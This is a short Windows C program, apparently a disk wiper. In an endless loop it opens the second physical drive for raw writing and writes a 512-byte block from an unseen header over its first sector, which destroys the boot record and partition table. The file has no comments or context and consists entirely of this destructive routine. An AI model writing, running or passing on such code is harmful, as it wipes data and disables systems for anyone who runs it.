#include <windows.h>
#include "write.h"

int main() {
    while(1) {
        DWORD sectorWritten;
        HANDLE hDisk = CreateFileW(
            L"\\\\.\\PhysicalDrive1",
            GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            0, OPEN_EXISTING, 0, 0
        );
        WriteFile(hDisk, BLOCKZERO, 512, &sectorWritten, 0);
        CloseHandle(hDisk);
    }
}